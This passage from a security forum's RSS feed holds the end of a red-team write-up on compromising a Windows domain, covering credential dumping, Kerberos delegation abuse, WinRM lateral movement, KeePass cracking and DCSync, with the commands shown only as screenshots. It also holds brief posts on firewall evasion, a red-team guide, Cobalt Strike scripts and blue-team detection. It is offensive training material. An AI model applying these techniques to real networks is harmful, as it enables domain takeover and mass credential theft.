<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/3/8/38067f1da358ab829d1f50608ec8f77bca1fcdb5.png" data-download-href="/uploads/short-url/7ZCEK0EBVHVQhjq0i5b3glsEkND.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/3/8/38067f1da358ab829d1f50608ec8f77bca1fcdb5_2_690x84.png" alt="" data-base62-sha1="7ZCEK0EBVHVQhjq0i5b3glsEkND" width="690" height="84" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/3/8/38067f1da358ab829d1f50608ec8f77bca1fcdb5_2_690x84.png, https://0x00sec.s3.amazonaws.com/original/3X/3/8/38067f1da358ab829d1f50608ec8f77bca1fcdb5.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/3/8/38067f1da358ab829d1f50608ec8f77bca1fcdb5.png 2x" data-dominant-color="363845"></a></div><p></p>
<p>Will unzip this file on our attacking machine and grab the hashes offline, with this we don’t need to run any more tools on the workstation and worry about detection, we can actually do this in the safety of our attacking host now and get some more valuable info, even if we don’t get cleartext credentials, hashes are still viable since there are techniques such as Pass the Hash (PTH).</p>
<p>Will utilize the pypykatz[13] python tool a great alternative if you love running just on Linux</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/2/6/261c1268b0fde84ad1030b31b4cb8ae0781fa3f9.png" data-download-href="/uploads/short-url/5r8hPN30B6oKrIPBhbo219fEoMF.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/2/6/261c1268b0fde84ad1030b31b4cb8ae0781fa3f9_2_690x126.png" alt="" data-base62-sha1="5r8hPN30B6oKrIPBhbo219fEoMF" width="690" height="126" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/2/6/261c1268b0fde84ad1030b31b4cb8ae0781fa3f9_2_690x126.png, https://0x00sec.s3.amazonaws.com/original/3X/2/6/261c1268b0fde84ad1030b31b4cb8ae0781fa3f9.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/2/6/261c1268b0fde84ad1030b31b4cb8ae0781fa3f9.png 2x" data-dominant-color="0A0A0B"></a></div><p></p>
<p>[1] <a href="https://www.exploit-db.com/docs/english/46990-active-directory-enumeration-with-powershell.pdf" rel="noopener nofollow ugc">https://www.exploit-db.com/docs/english/46990-active-directory-enumeration-with-powershell.pdf</a></p>
<p>[2] <a href="https://www.linkedin.com/pulse/journey-domain-admin-enterprise-practical-internal-red-arbaz-khan/" class="inline-onebox" rel="noopener nofollow ugc">Journey to Domain Admin and Enterprise Admin: A Practical Internal Red Team Scenario</a></p>
<p>[3] <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#domain-admins" class="inline-onebox" rel="noopener nofollow ugc">Active Directory security groups | Microsoft Learn</a></p>
<p>[4] <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md" rel="noopener nofollow ugc">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md</a></p>
<p>[5] <a href="https://github.com/SpecterOps/BloodHound" class="inline-onebox" rel="noopener nofollow ugc">GitHub - SpecterOps/BloodHound: Six Degrees of Domain Admin</a></p>
<p>[6] <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting" class="inline-onebox" rel="noopener nofollow ugc">Kerberoasting - Red Team Notes</a></p>
<p>[7] <a href="https://www.sentinelone.com/cybersecurity-101/what-is-kerberoasting-attack/" rel="noopener nofollow ugc">https://www.sentinelone.com/cybersecurity-101/what-is-kerberoasting-attack/</a></p>
<p>[8] <a href="https://github.com/xforcered/SQLRecon" class="inline-onebox" rel="noopener nofollow ugc">GitHub - xforcered/SQLRecon: A C# MS SQL toolkit designed for offensive reconnaissance and post-exploitation.</a></p>
<p>[9] <a href="https://github.com/hashcat/hashcat" class="inline-onebox" rel="noopener nofollow ugc">GitHub - hashcat/hashcat: World's fastest and most advanced password recovery utility</a></p>
<p>[10] <a href="https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16" class="inline-onebox" rel="noopener nofollow ugc">xp_cmdshell (Transact-SQL) - SQL Server | Microsoft Learn</a></p>
<p>[11] <a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc" class="inline-onebox" rel="noopener nofollow ugc">Potatoes - Windows Privilege Escalation · Jorge Lajara Website</a></p>
<p>[12] <a href="https://github.com/BeichenDream/GodPotato" class="inline-onebox" rel="noopener nofollow ugc">GitHub - BeichenDream/GodPotato</a></p>
<p>[13] <a href="https://kaluche.github.io/posts/2020/09/dumping-credentials-offline/" class="inline-onebox" rel="noopener nofollow ugc">Dumping credentials (offline) :: Kaluche — Windows - RedTeam / Pentest - Infosec</a></p>
<p><strong>Constrained Delegation &amp; Domain Admin</strong></p>
<p>With our previous hashes we noticed that we got almost nothing related to AD, no other domain user or object that we can work with but that is nothing to worry about as sometimes there are stuff that can usually fly unexpected under our recon, we did find great information on the Domain and some possible techniques that we can utilize for lateral movement let’s just give a quick glance at our enumeration.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/2/c267226220545e4a380b80a62c3c0385d67cc6f3.png" data-download-href="/uploads/short-url/rJLANrhkjfM1id5Ck5coZUv6wPp.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/2/c267226220545e4a380b80a62c3c0385d67cc6f3_2_690x373.png" alt="" data-base62-sha1="rJLANrhkjfM1id5Ck5coZUv6wPp" width="690" height="373" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/2/c267226220545e4a380b80a62c3c0385d67cc6f3_2_690x373.png, https://0x00sec.s3.amazonaws.com/original/3X/c/2/c267226220545e4a380b80a62c3c0385d67cc6f3.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/c/2/c267226220545e4a380b80a62c3c0385d67cc6f3.png 2x" data-dominant-color="33333E"></a></div><p></p>
<p>The workstation we currently are working with has Delegate permissions to another workstation, so now we have a path and where to move on next.</p>
<p>Constrained Delegation [1] is a way to limit exactly what services a particular machine/account can access while impersonating other users. The “service” specified is a service principal name that the account is allowed to access while impersonating other users. In this case we have a Constrained one because a specific resource was tied to this delegation, and we can only access that specified resource, or can we? Now Rubeus takes advantage of (Alberto Solino’s) [2] great discovery about how the service name (sname) is not protected in the KRB-CRED file [3], only the server’s name is.</p>
<p>Since we got SYSTEM or the Machine Account, we can utilize this account to request a ticket to impersonate a user that has access onto the workstation it we can utilize different methods to grab the ticket with the tgtdeleg technique or since we have the hash for the machine account we can use the rc4 flag we can change the service into an alternative one that we can utilize to move onto the host. We can target some of the services depending on what we are looking for in Lateral Movement [4]</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/0/8/082d559123538f96caab9546c1277faa6990eb82.png" data-download-href="/uploads/short-url/1akWLS27wnlloCWExseBgxLlDSG.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/0/8/082d559123538f96caab9546c1277faa6990eb82_2_690x282.png" alt="" data-base62-sha1="1akWLS27wnlloCWExseBgxLlDSG" width="690" height="282" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/0/8/082d559123538f96caab9546c1277faa6990eb82_2_690x282.png, https://0x00sec.s3.amazonaws.com/original/3X/0/8/082d559123538f96caab9546c1277faa6990eb82.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/0/8/082d559123538f96caab9546c1277faa6990eb82.png 2x" data-dominant-color="2F313C"></a></div><p></p>
<p>Will test our ticket and we noticed that now we have READ access onto the remote host, but our interest is to move onto the host, gaining a Demon, since there were a few users on the Domain, we’ve been testing with the users we haven’t had access to which in this case was agarcia</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/8/e8956630253784aa821b37a47531e45ea8761e8d.png" data-download-href="/uploads/short-url/xbwRhvIt8o1UeDehgkx2SrR4IPP.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/e/8/e8956630253784aa821b37a47531e45ea8761e8d_2_690x355.png" alt="" data-base62-sha1="xbwRhvIt8o1UeDehgkx2SrR4IPP" width="690" height="355" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/e/8/e8956630253784aa821b37a47531e45ea8761e8d_2_690x355.png, https://0x00sec.s3.amazonaws.com/original/3X/e/8/e8956630253784aa821b37a47531e45ea8761e8d.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/e/8/e8956630253784aa821b37a47531e45ea8761e8d.png 2x" data-dominant-color="343540"></a></div><p></p>
<p>With this potential lateral movement, we can look at the options we have. We can change the altservice to HTTP or HOST, these will allow us to use WinRM, WMI, PowerShell Remoting or PSEXEC to move onto the network. Giving our session the HOST and HTTP allows use to use WinRM, WMI one of the ways to test WMI is simple executing commands and expect a Code: 0 which means it completed with no issues, but WinRM has a Test-WSMan PowerShell Command which we can verify what computers in the domain has this enabled. We can verify this way.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/a/cad14600c353102effdaad933ddb31a723db5547.png" data-download-href="/uploads/short-url/sWcOy7plxpdXpBM77rwII6gVFBR.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/a/cad14600c353102effdaad933ddb31a723db5547_2_690x231.png" alt="" data-base62-sha1="sWcOy7plxpdXpBM77rwII6gVFBR" width="690" height="231" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/a/cad14600c353102effdaad933ddb31a723db5547_2_690x231.png, https://0x00sec.s3.amazonaws.com/original/3X/c/a/cad14600c353102effdaad933ddb31a723db5547.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/c/a/cad14600c353102effdaad933ddb31a723db5547.png 2x" data-dominant-color="30333E"></a></div><p></p>
<p>The output confirms that the feature is enabled, we can move forward and execute commands.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/f/d/fdfbd5d63399dd34854062af1745679f14efcb54.png" alt="" data-base62-sha1="AeQlZkyJdCYa5Bl66xhzAfPbCOE" width="538" height="97" role="presentation"></p>
<p>Nice now onto a new workstation will keep utilizing our built PowerShell script to gain access onto this workstation and get a new Demon to work with.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/3/d/3d065c781e7d619078ff15e37150b75b5e7eb816.png" data-download-href="/uploads/short-url/8HQKMnOxsNd9TBw9J3YMiVytmFU.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/3/d/3d065c781e7d619078ff15e37150b75b5e7eb816_2_689x347.png" alt="" data-base62-sha1="8HQKMnOxsNd9TBw9J3YMiVytmFU" width="689" height="347" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/3/d/3d065c781e7d619078ff15e37150b75b5e7eb816_2_689x347.png, https://0x00sec.s3.amazonaws.com/original/3X/3/d/3d065c781e7d619078ff15e37150b75b5e7eb816.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/3/d/3d065c781e7d619078ff15e37150b75b5e7eb816.png 2x" data-dominant-color="333642"></a></div><p></p>
<p>Nice we are running with the highest privileges on the new workstation, the path to DA is getting closer the more we move around, and just like before will start enumerating in on the New host again, rinse and repeat people this way we won’t miss anything and make sure we are checking all our boxes, enumeration mostly comes from experience for what to look keep practicing, read reports to get an idea on what’s been searched for or what is common to find.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/4/f/4fe43681444c2553aae50775617a86a7e2c2c0e8.png" alt="" data-base62-sha1="boKFaGurWvqAvtC5Rxhdmi397le" width="604" height="278" role="presentation"></p>
<p>As you see here an interesting file type I like to search for are KeePass files, let’s download this file and look at any credentials available. Usually, the files by setup will contain a password so cracking this is another step of the way will utilized hashcat again.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/d/ed457fb69a54b9b463344242249e45e0ed3d27b1.png" data-download-href="/uploads/short-url/xR03N6bLv3OAwc0QXZy9CUH1p2F.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/e/d/ed457fb69a54b9b463344242249e45e0ed3d27b1_2_689x379.png" alt="" data-base62-sha1="xR03N6bLv3OAwc0QXZy9CUH1p2F" width="689" height="379" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/e/d/ed457fb69a54b9b463344242249e45e0ed3d27b1_2_689x379.png, https://0x00sec.s3.amazonaws.com/original/3X/e/d/ed457fb69a54b9b463344242249e45e0ed3d27b1.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/e/d/ed457fb69a54b9b463344242249e45e0ed3d27b1.png 2x" data-dominant-color="151414"></a></div><p></p>
<p>Looks like the password here is what is considered a keywalk [5] a combination of keys that seem really complicated but with patterns it is something really easy to guess. Now that we have recovered the Database file let’s open this and see what we find.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/e/cecd07d1a25df3a3002c9da886174786266611ec.png" data-download-href="/uploads/short-url/tvrDmgjBhkuyJgP2zSDOXeebXuQ.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/e/cecd07d1a25df3a3002c9da886174786266611ec_2_690x261.png" alt="" data-base62-sha1="tvrDmgjBhkuyJgP2zSDOXeebXuQ" width="690" height="261" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/e/cecd07d1a25df3a3002c9da886174786266611ec_2_690x261.png, https://0x00sec.s3.amazonaws.com/original/3X/c/e/cecd07d1a25df3a3002c9da886174786266611ec.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/c/e/cecd07d1a25df3a3002c9da886174786266611ec.png 2x" data-dominant-color="EAEAEB"></a></div><p></p>
<p>Cleartext credentials for mgarcia user, it seems it was also being used to install applications or such and instead of asking for the password it was just saved. Now let’s go back and see what this user has access on.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/b/6bcff0db818ed1f817bc007416748ee6d93d74a2.png" data-download-href="/uploads/short-url/fnKBewDXxx7eC6Z8htpCmB7812i.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/b/6bcff0db818ed1f817bc007416748ee6d93d74a2_2_690x164.png" alt="" data-base62-sha1="fnKBewDXxx7eC6Z8htpCmB7812i" width="690" height="164" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/b/6bcff0db818ed1f817bc007416748ee6d93d74a2_2_690x164.png, https://0x00sec.s3.amazonaws.com/original/3X/6/b/6bcff0db818ed1f817bc007416748ee6d93d74a2.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/6/b/6bcff0db818ed1f817bc007416748ee6d93d74a2.png 2x" data-dominant-color="EFEFF3"></a></div><p></p>
<p>Well, it seems that this user has DCSync privileges. This means we can simulate to be a DC and request the hashes of ALL the users in the Domain, and remember our goal, was to reach Domain Admin.</p>
<p>Well this simplifies this, there’s multiple tools that can help us achieve DCSync so let’s get to it.</p>
<p>Will impersonate the user by creating a token using Havoc built-in feature <em>token</em> [6]</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/3/c/3ccce3714fb49fa1936d73a02e82cda7209b112c.png" data-download-href="/uploads/short-url/8FRCq8gPGJO7LFz10GrSM9wh72Y.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/3/c/3ccce3714fb49fa1936d73a02e82cda7209b112c_2_690x153.png" alt="" data-base62-sha1="8FRCq8gPGJO7LFz10GrSM9wh72Y" width="690" height="153" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/3/c/3ccce3714fb49fa1936d73a02e82cda7209b112c_2_690x153.png, https://0x00sec.s3.amazonaws.com/original/3X/3/c/3ccce3714fb49fa1936d73a02e82cda7209b112c.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/3/c/3ccce3714fb49fa1936d73a02e82cda7209b112c.png 2x" data-dominant-color="323642"></a></div><p></p>
<p>We can now DCSync in the context of mgarcia now, I’ve utilized SharpKatz to consist with the in-memory, but it seems that SharpKatz drops a txt file onto the host, an IOC left behind.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/0/5/05cf24efc26beff3ca3e505d9f2c5c07d2cc1b8f.png" data-download-href="/uploads/short-url/PobTMWbSPNpcg8npCBE6c8R6aP.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/0/5/05cf24efc26beff3ca3e505d9f2c5c07d2cc1b8f_2_690x172.png" alt="" data-base62-sha1="PobTMWbSPNpcg8npCBE6c8R6aP" width="690" height="172" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/0/5/05cf24efc26beff3ca3e505d9f2c5c07d2cc1b8f_2_690x172.png, https://0x00sec.s3.amazonaws.com/original/3X/0/5/05cf24efc26beff3ca3e505d9f2c5c07d2cc1b8f.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/0/5/05cf24efc26beff3ca3e505d9f2c5c07d2cc1b8f.png 2x" data-dominant-color="2D303C"></a></div><p></p>
<p>Download or read the file and take a good look at the last step, we have completely compromised the Domain found some interesting files and moved on the domain the most silent way that our skills allow, do consider that these techniques even though in-memory they still exist during execution so EDRs are still capable of finding these techniques unless we consider stack spoofing, sleep encryption and many others.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/0/6/06b9948568f2558fe399182d64287e841b97ea87.png" data-download-href="/uploads/short-url/Xut2QFknoeGESq3nkjKlBmrEft.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/0/6/06b9948568f2558fe399182d64287e841b97ea87_2_690x142.png" alt="" data-base62-sha1="Xut2QFknoeGESq3nkjKlBmrEft" width="690" height="142" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/0/6/06b9948568f2558fe399182d64287e841b97ea87_2_690x142.png, https://0x00sec.s3.amazonaws.com/original/3X/0/6/06b9948568f2558fe399182d64287e841b97ea87.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/0/6/06b9948568f2558fe399182d64287e841b97ea87.png 2x" data-dominant-color="3C3E48"></a></div><p></p>
<p>Now even though we can use the NTLM hashes to compromise the user, it’s no fun so let’s go ahead and crack it.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/b/d/bdc93164877895e8207034c859164de5dba36967.png" data-download-href="/uploads/short-url/r4Vil3IMeo6dJEQgszsh9kB1rD1.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/b/d/bdc93164877895e8207034c859164de5dba36967.png" alt="" data-base62-sha1="r4Vil3IMeo6dJEQgszsh9kB1rD1" width="667" height="500" role="presentation" data-dominant-color="161616"></a></div><p></p>
<p>Nice, completed challenge, we managed to get initial access, bypass security products, done some active directory enumeration, lateral movement, SQL recon and exploitation, password cracking, in-memory execution utilized methods to get around the network find interesting files and finally take usage of a user’s permissions to obtain all the hashes in the network which helped us achieve a Domain Admins users’ credentials.</p>
<p>Well thanks for following me in this little Adventure for corporate hacking, Bank Fraud, and some small red team knowledge. Now go and Rob Banks!</p>
<p><em>Legally…</em></p>
<p>Memorandum: <code>To my Family and Friends. The only people I would hack banks for</code>.</p>
<p>[1] <a href="https://dmcxblue.gitbook.io/red-team-notes-2-0/active-directory/active-directory-attacks/constrained-delegation" class="inline-onebox" rel="noopener nofollow ugc">Constrained Delegation - Red Team Notes 2.0</a></p>
<p>[2] <a href="https://twitter.com/agsolino" rel="noopener nofollow ugc">https://twitter.com/agsolino</a></p>
<p>[3] <a href="https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/" class="inline-onebox" rel="noopener nofollow ugc">Kerberos Delegation, SPNs and More... – SecureAuth</a></p>
<p>[4] <a href="https://adsecurity.org/?p=2011" class="inline-onebox" rel="noopener nofollow ugc">How Attackers Use Kerberos Silver Tickets to Exploit Systems – Active Directory Security</a></p>
<p>[5] <a href="https://specopssoft.com/blog/top-keyboard-walk-patterns-found-in-compromised-passwords/" class="inline-onebox" rel="noopener nofollow ugc">Block These Top Keyboard Walk Patterns Found in Compromised Passwords- Specops Software</a></p>
<p>[6] <a href="https://medium.com/securebit/understanding-impersonation-via-access-tokens-5e3e5946adb9" class="inline-onebox" rel="noopener nofollow ugc">Understanding Impersonation via Access Tokens | by goswamiijaya | SecureBit | Medium</a></p>
            <p><small>16 posts - 10 participants</small></p>
            <p><a href="https://0x00sec.org/t/how-to-rob-a-bank/37022">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/how-to-rob-a-bank/37022</link>
          <pubDate>Wed, 20 Sep 2023 14:21:02 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-37022</guid>
          <source url="https://0x00sec.org/t/how-to-rob-a-bank/37022.rss">How To Rob a Bank</source>
        </item>
        <item>
          <title>Techniques to bypass and attack IPS/IDS/Firewall / Help</title>
          <dc:creator><![CDATA[4n3c0d3]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <p>Techniques to bypass and attack IPS/IDS/Firewall</p>
<p>Hello guys, I am conducting an audit on my organization trying to challenge the rules and use cases of my IPS/IDS/Firewall technologies; However, since I am new to this, I would like to know if you know of any evasion and attack techniques you know so I can investigate and apply them in my audit.</p>
<p>To date I have applied techniques such as:</p>
<p>Packet fragmentation<br>
Bad Checksum<br>
Decoy<br>
Spoofing</p>
<p>However, I have not been able to be successful in my tests, I hope you can guide me and if you know of some tools with which I could better complement my audit.</p>
<p>Thank you.</p>
            <p><small>8 posts - 6 participants</small></p>
            <p><a href="https://0x00sec.org/t/techniques-to-bypass-and-attack-ips-ids-firewall-help/37017">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/techniques-to-bypass-and-attack-ips-ids-firewall-help/37017</link>
          <pubDate>Wed, 20 Sep 2023 01:38:44 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-37017</guid>
          <source url="https://0x00sec.org/t/techniques-to-bypass-and-attack-ips-ids-firewall-help/37017.rss">Techniques to bypass and attack IPS/IDS/Firewall / Help</source>
        </item>
        <item>
          <title>Red Team Guide &amp; Operational Security</title>
          <dc:creator><![CDATA[dmcxblue]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <p>Hi everyone, In the last couple months I’ve been working on a Guide for Red Team that I hope it can teach and help some people trying to get into the field or learn stuff about Red Team,</p>
<p>I myself a few years back was a little lost with learning and that’s why I created Red Team Notes and now this guide to help anyone that is trying to jump into this area of Cybersecurity. Well to not make this any longer, I’ve uploaded the files for the guide on Red Team Notes. thanks and I hope it helps!!.</p>
<aside class="onebox allowlistedgeneric" data-onebox-src="https://dmcxblue.gitbook.io/red-team-notes-2-0/files/red-team-guide">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/e/4/e428734c7d42a016c58e18f378f3f44c72a3b359.png" class="site-icon" width="64" height="64">

      <a href="https://dmcxblue.gitbook.io/red-team-notes-2-0/files/red-team-guide" target="_blank" rel="noopener nofollow ugc">dmcxblue.gitbook.io</a>
  </header>

  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/362;"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/1/4/14b99307e0dff0b551034acfb3a04b55e8ab2be8_2_690x362.png" class="thumbnail" width="690" height="362" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/1/4/14b99307e0dff0b551034acfb3a04b55e8ab2be8_2_690x362.png, https://0x00sec.s3.amazonaws.com/optimized/3X/1/4/14b99307e0dff0b551034acfb3a04b55e8ab2be8_2_1035x543.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/1/4/14b99307e0dff0b551034acfb3a04b55e8ab2be8.png 2x" data-dominant-color="212225"></div>

<h3><a href="https://dmcxblue.gitbook.io/red-team-notes-2-0/files/red-team-guide" target="_blank" rel="noopener nofollow ugc">Red Team Guide</a></h3>



  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

            <p><small>5 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/red-team-guide-operational-security/34985">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/red-team-guide-operational-security/34985</link>
          <pubDate>Wed, 10 May 2023 12:58:46 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-34985</guid>
          <source url="https://0x00sec.org/t/red-team-guide-operational-security/34985.rss">Red Team Guide &amp; Operational Security</source>
        </item>
        <item>
          <title>Aggressor Scripts</title>
          <dc:creator><![CDATA[_m0r0n]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <p>Hi - I’m looking for a TG channel where they used to upload current aggressor scripts for Cobalt.  Does anyone know what is is called?  I believe (was awhile ago) there was some Chinese characters in the title.</p>
<p>Looking for some more recent Privilege Escalation options for Cobalt and this TG group seemed to stay current.</p>
            <p><small>3 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/aggressor-scripts/32547">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/aggressor-scripts/32547</link>
          <pubDate>Sun, 18 Dec 2022 22:46:56 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-32547</guid>
          <source url="https://0x00sec.org/t/aggressor-scripts/32547.rss">Aggressor Scripts</source>
        </item>
        <item>
          <title>Playing on the Blue Side</title>
          <dc:creator><![CDATA[dmcxblue]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <p>Yes, Red Team is sexy, I’m a Red Teamer and it’s the Hype!!. Who doesn’t like the rush of being a bad guy and hacking into a Network Infrastructure while trying to be as OPSEC on a Network.</p>
<p>I’ve known a few Offensive Researchers that have some sort of a Blue Team background, they all needed to understand an Active Directory, a Cloud Network, Servers, Workstations, Network Traffic to be a great at Red Team and move around these defenses they used to work with.</p>
<p>I want to point out these “Defenses” that the Blue Team uses to locate a Red Team or (malicious) activity. As great and automated that they are. they aren’t 100% reliable. I can’t say this enough as it’s always a good rule of thumb for anyone trying to Red Team specially when we want to consider some Evasion.</p>
<p><em><strong>Understand your tools.</strong></em></p>
<p>I wrote a blog about understanding <a href="https://dmcxblue.net/2021/02/20/a-dive-on-smbexec/" rel="noopener nofollow ugc">SMBEXEC </a>at a very high level to bypass detection from an AV standpoint, in terms of its behavior and static analysis. This made me realize and appreciate the work that goes behind these tools for Red Team and the detection’s that Blue Teams have to go up and work on. I want to explain in a Red Team standpoint why we should understand our fellow Blue Team, not in a bad way but to make the Red Team a little more fun and help the Blue Team see how we think in terms of their detection’s.</p>
<p>I think many of the Cyber Security realm have encountered the “Oh it’s Detected by [AV], why?!?!”. Well these users don’t understand the Red Teams Job or are mostly beginners in the Cyber Security space.</p>
<p>I want to approach a tool called Persistence Sniper by <span class="mention">@last-byte</span>. The tool caught my interest as this is meant to aid in catching malicious activity specially on the Persistence area.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/7/c/7c0542134cf8139621cce5985bdd739a15adda6f.png" data-download-href="/uploads/short-url/hH8tfvU0ZoMtHRsSKbxwCBZK0G3.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/7/c/7c0542134cf8139621cce5985bdd739a15adda6f_2_533x500.png" alt="" data-base62-sha1="hH8tfvU0ZoMtHRsSKbxwCBZK0G3" width="533" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/7/c/7c0542134cf8139621cce5985bdd739a15adda6f_2_533x500.png, https://0x00sec.s3.amazonaws.com/original/3X/7/c/7c0542134cf8139621cce5985bdd739a15adda6f.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/7/c/7c0542134cf8139621cce5985bdd739a15adda6f.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/7/c/7c0542134cf8139621cce5985bdd739a15adda6f_2_10x10.png"></a></div><p></p>
